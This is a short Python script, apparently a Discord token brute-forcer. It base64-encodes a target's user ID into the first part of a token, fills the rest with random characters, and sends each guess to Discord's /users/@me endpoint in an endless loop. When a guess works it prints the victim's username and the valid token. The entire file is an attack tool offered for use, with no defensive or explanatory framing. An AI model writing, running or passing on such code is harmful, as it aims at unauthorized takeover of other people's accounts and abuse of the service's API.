import base64, random, requests


discord_id = input("ID : --> ")


id_encode = discord_id.encode("UTF-8")
id_encodeb64 = base64.b64encode(id_encode)
id_decode = id_encodeb64.decode("UTF-8")


while True:
    list_ca = list(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r',
         's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '.', '_'])

    TOKEN = id_decode + "." + ('').join(random.choices(list_ca, k=6)) + "." + ('').join(random.choices(list_ca, k=38))
    print(TOKEN)


    try:
        headers = {"Authorization": TOKEN, "Content-Type": "application/json"}
        userinfo = requests.get('https://discordapp.com/api/v9/users/@me', headers=headers).json()
        username = userinfo["username"]
        discriminator = userinfo["discriminator"]
        userid = userinfo["id"]

        print(f"Logged in as {username}#{discriminator} ({userid}).")
        print("Token valid :)")
        print("Le Token est "+TOKEN)
        break

    except:
        print("Token invalid :(")
